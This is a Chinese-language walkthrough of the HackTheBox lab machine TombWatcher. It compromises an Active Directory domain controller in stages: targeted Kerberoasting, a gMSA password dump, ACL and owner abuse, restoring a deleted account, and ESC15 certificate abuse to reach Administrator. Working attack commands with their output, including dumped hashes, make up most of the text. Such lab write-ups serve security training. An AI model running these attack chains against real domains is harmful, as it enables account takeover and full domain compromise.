# 一：初步渗透

初始账户：henry / H3nry_987TGV!

nmap扫一下端口：

```
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
5985/tcp open  wsman
```

有dns，ldap，smb等服务，大概率是DC。nmap -sV 扫一下389端口：

```
nmap 10.10.11.72 -v -sV -p 389

PORT    STATE SERVICE VERSION
389/tcp open  ldap    Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

发现域名tombwatcher.htb，写入/etc/hosts中

有80端口，我们访问一下网页。主页面就是一张图片，指向http://go.microsoft.com/fwlink/?linkid=66138&clcid=0x409，这个网址是microsoft介绍修复IIS服务器一些问题的方法。前两篇文章介绍的是修复W3WP内存泄露：

## W3WP

> - **全称**：World Wide Web Worker Process（万维网工作进程）。
> - **作用**：它是微软 IIS Web 服务器的核心引擎。当用户通过浏览器请求你的网站（[ASP.NET](https://asp.net/), ASP.NET Core 等）时，IIS 会创建一个或多个 `W3WP.exe` 进程来实际执行你的代码、处理业务逻辑、访问数据库，并最终生成 HTML 返回给用户。
> - **应用程序池**：在 IIS 中，每个网站或一组网站会运行在一个指定的“应用程序池”中。每个应用程序池都会独立运行一个或多个 `W3WP.exe` 进程。这样做的目的是为了隔离，一个网站的崩溃不会影响其他网站。

内存泄露就是W3WP.exe不断申请使用内存，但是没有正确释放它们。

这里不知道有什么用，先留意一下

## SMB

尝试访问SMB：

```
nxc smb 10.10.11.72 -u henry -p H3nry_987TGV! --shares

SMB         10.10.11.72     445    DC01             Share           Permissions     Remark
SMB         10.10.11.72     445    DC01             -----           -----------     ------
SMB         10.10.11.72     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.72     445    DC01             C$                              Default share
SMB         10.10.11.72     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.72     445    DC01             NETLOGON        READ            Logon server share
SMB         10.10.11.72     445    DC01             SYSVOL          READ            Logon server share
```

NETLOGON和SYSVOL都是AD环境下的默认共享，这里没有什么可利用的共享

通过--users枚举一下域中用户：

```
Administrator
Guest
krbtgt
Henry
Alfred
sam
join
```

## BloodHound

bloodhound-python或者sharphound采集信息：

```
bloodhound-python -d tombwatcher.htb -dc tombwatcher.htb -u henry -p 'H3nry_987TGV!' -c all --zip -ns 10.10.11.72
```

然后启动bloodhound，上传数据并解析：

![image-20251016141138275](https://raw.githubusercontent.com/ssaa769/typora-images/main/typora/image-20251016141138275.png)

重点是ADCS OU，但是这个OU内没有任何用户，组或者计算机。我们先不管，从第一步到Alfred开始：

## WriteSPN

要知道什么是WriteSPN，就先要知道什么是SPN。

> **SPN** 的全称是**服务主体名称**，它是一种唯一的标识符，客户端（如用户电脑）使用它来在网络上唯一地标识一个服务实例。这对于 Kerberos 认证至关重要。**格式**： `服务类型/主机名:端口/可选的名称`

在使用TGT向TGS请求ST时，就是用SPN向TGS指明要访问哪个服务实例。

在 Active Directory 中，SPN 被注册在**用户账户**或**计算机账户**的属性上。

> `WriteSPN` 是一个特定的 Active Directory 权限，它允许被授予者**修改**一个 AD 账户（用户或计算机）上的 `servicePrincipalName` 属性。
>
> - **本质**： 它是对某个 AD 对象的**写属性权限**，具体是针对 `servicePrincipalName` 这个属性。
> - **作用对象**： 可以授予给一个用户、组或计算机账户，使其能够修改**另一个**用户或计算机账户的 SPN。

如何利用,主要是进行kerberoasting攻击。kerberoasting攻击简单来说就是向TGS请求目标服务的ST，然后离线破解加密ST的服务账户密码。

我们通过WriteSPN权限为Alfred用户的注册一个虚构的SPN，这个SPN只要在域内是唯一的，DC就会接受它。然后DC就会认为这个虚假的SPN对应的服务由Alfred账户运行，任何用户都可以为这个服务请求kerberos票据，KDC会使用Alfred账户的NT哈希来加密这张返回的票据，我们拿到后离线破解即可。

这里就可以联想到U2U。U2U正是为了解决这种不安全的**返回使用其他账户哈希加密的票据**的操作，它使用了服务用户的会话密钥代替长期的NT哈希。

攻击利用，可以set-spn或者bloodAD等写入SPN，然后rubeus执行kerberoasting攻击。

这里直接使用工具：https://github.com/ShutdownRepo/targetedKerberoast

注意kerberos认证对系统时间同步有要求，我们先停止本机时间同步服务：

```
systemctl stop systemd-timesyncd
```

然后使用ntpdate手动和靶机时间同步：

```
ntpdate 10.10.11.72
```

然后使用脚本发起攻击：

```
python3 targetedKerberoast.py -v -d tombwatcher.htb -u henry -p 'H3nry_987TGV!'
```

将拿到的hash保存，使用hashcat破解：

```
└─# hashcat hash -m 13100 -a 0 rockyou.txt
```

结果是basketball

可以使用`nxc smb`验证一下：
```
SMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\Alfred:basketball
```

说明密码正确！

# 二：持续横移

接下来就是持续横向移动，Alfred账户对infrastructure组有addself权限，我们使用bloodAD添加用户到组内：

```
└─# bloodyAD -u Alfred -p 'basketball' --host 10.10.11.72 add groupMember INFRASTRUCTURE Alfred
[+] Alfred added to INFRASTRUCTURE
```

infrastructure组又对计算机ANSIBLE_DEV$有ReadGMSAPassword权限

在bloodhound中可以看到SpecterOPS对这个权限的利用指导(上面的targetedKerberoast.py也为你给了链接)：

> There are several ways to abuse the ability to read the GMSA password. The most straight forward abuse is possible when the GMSA is currently logged on to a computer, which is the intended behavior for a GMSA. If the GMSA is logged on to the computer account which is granted the ability to retrieve the GMSA's password, simply steal the token from the process running as the GMSA, or inject into that process.
>
> If the GMSA is not logged onto the computer, you may create a scheduled task or service set to run as the GMSA. The computer account will start the sheduled task or service as the GMSA, and then you may abuse the GMSA logon in the same fashion you would a standard user running processes on the machine (see the "HasSession" help modal for more details).
>
> Finally, it is possible to remotely retrieve the password for the GMSA and convert that password to its equivalent NT hash.gMSADumper.py can be used for that purpose.
>
> gMSADumper.py -u 'user' -p 'password' -d 'domain.local'
>
> At this point you are ready to use the NT hash the same way you would with a regular user account. You can perform pass-the-hash, overpass-the-hash, or any other technique that takes an NT hash as an input.

gMSA全称是**组托管服务账户（Group Managed Service Account，gMSA）**。这是微软引用的一种特殊类新的账户，与传统服务账户不同，它的密码由AD自动管理，而不是像普通服务密码那样需要手动设置，手动更新。

这个权限顾名思义就是让我们可以读取gMSA密码，利用脚本：https://github.com/micahvandeusen/gMSADumper

```
└─# python3 gMSADumper.py -u Alfred -p basketball -d tombwatcher.htb
Users or groups who can read password for ansible_dev$:
 > Infrastructure
ansible_dev$:::bf8b11e301f7ba3fdc616e5d4fa01c30
ansible_dev$:aes256-cts-hmac-sha1-96:f36c76683b132f15610b96c7570f8749f7bf7d41bb87339536737fa02ba483b9
ansible_dev$:aes128-cts-hmac-sha1-96:8e2884da3f366cd9faa83445a1ebbf36
```

第一个就是NTLM哈希，账户名`ansible_dev$`,哈希值`bf8b11e301f7ba3fdc616e5d4fa01c30`

然后通过ForceChangePassword权限修改sam的密码：

```
└─# bloodyAD -u 'ansible_dev$' -p ':bf8b11e301f7ba3fdc616e5d4fa01c30' --host 10.10.11.72  set password sam 'Orange33315!'
```

sam对john有WriteOwner权限，可以把john的所有者改为自己,可以使用bloodyAD，这里使用bloodhound中提提议的impakcet-ownerdit

```
└─# impacket-owneredit -action write -dc-ip 10.10.11.72 -target-sid 'S-1-5-21-1392491010-1358638721-2126982587-1106' -new-owner-sid 'S-1-5-21-1392491010-1358638721-2126982587-1105'  tombwatcher.htb/sam:Orange33315!
Impacket v0.13.0.dev0+20250912.114226.b742bd4d - Copyright Fortra, LLC and its affiliated companies 

[*] Current owner information below
[*] - SID: S-1-5-21-1392491010-1358638721-2126982587-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=tombwatcher,DC=htb
[*] OwnerSid modified successfully!
```

然后使用impacket-dacledit为自己添加GenericALL权限：

```
└─# impacket-dacledit -action write -rights FullControl -principal sam -target john tombwatcher.htb/sam:Orange33315!
```

然后就可以修改密码了：

```
└─# bloodyAD -u sam -p 'Orange33315!' --host 10.10.11.72 set password john Orange333
15!
#impacket-changepassword  也可以，bloodyAD和impacket随便用
```

到这里john就在远程管理组里了，我们远程登录：

```
└─# evil-winrm -i 10.10.11.72 -u john -p 'Orange33315!' 
```

在C:\Users\john\Desktop\拿到user.txt

# 三：权限提升

john用户对ADCS OU有GenericALL权限，但是在bloodhound中我们发现ADCS OU是空的。联想域名**TombWatcher**（墓碑看守者），我们可以找被删除的用户对象：

```
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects
```

Get-ADObject用于检索AD对象，-Filter筛选，后面`isDeleted -eq $true`筛选出被标记为删除的对象，`-IncludeDeletedObjects`指示搜索已经删除的对象。

注意这里的删除是指放入了回收站，但是并没有完全删除

找到了被删除的账户`cert_admin`

我们使用powershell恢复它：

```
Restore-ADObject -Identity c1f1f0fe-df9c-494c-bf05-0679e181b358
```

然后启用账户：
```
Enable-ADAccount -Identity cert_admin
```

最后验证：

```
*Evil-WinRM* PS C:\Users\john\Documents> Get-ADUser -Identity cert_admin

DistinguishedName : CN=cert_admin,OU=ADCS,DC=tombwatcher,DC=htb
Enabled           : True
GivenName         : cert_admin
Name              : cert_admin
ObjectClass       : user
ObjectGUID        : c1f1f0fe-df9c-494c-bf05-0679e181b358
SamAccountName    : cert_admin
SID               : S-1-5-21-1392491010-1358638721-2126982587-1110
Surname           : cert_admin
UserPrincipalName :
```

我们使用bloodaAD给它改个密码，在powershell中操作也可以：

```
└─# bloodyAD -u john -p 'Orange33315!' --host 10.10.11.72 set password cert_admin Orange33315!
[+] Password changed successfully!
或者
Set-ADAccountPassword -Identity cert_admin -Reset -NewPassword (ConvertTo-SecureString "Orange33315!" -AsPlainText -Force)
```

然后就是certipy找可以利用的证书模板：
```
└─# certipy-ad find -dc-ip 10.10.11.72 -u cert_admin -p 'Orange33315!' -vulnerable -stdout
```

```
  0
    Template Name                       : WebServer
[!] Vulnerabilities
      ESC15                             : Enrollee supplies subject and schema version is 1.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patch
```

这里存在ESC15攻击途径：

```
└─# certipy-ad req \
    -u 'cert_admin@tombwatcher.htb' -p 'Orange33315!' \
    -dc-ip '10.10.11.72' -target 'DC01.tombwatcher.htb' \
    -ca 'tombwatcher-CA-1' -template 'WebServer' \
    -upn 'administrator@tombwatcher.htb'  \
    -application-policies 'Client Authentication'
```

```
└─# certipy-ad auth -pfx 'administrator.pfx' -dc-ip '10.10.11.72' -ldap-shell
```

```
# change_password administrator Orange33315!
```

```
─# evil-winrm -i 10.10.11.72 -u Administrator -p 'Orange33315!'
```

在C:\Users\Administrator\Desktop下找到root.txt：

```
91f5c0688ad46cfd254c896c1907cf5f
```

参考：https://www.hyhforever.top/posts/2025/06/htb-tombwatcher/

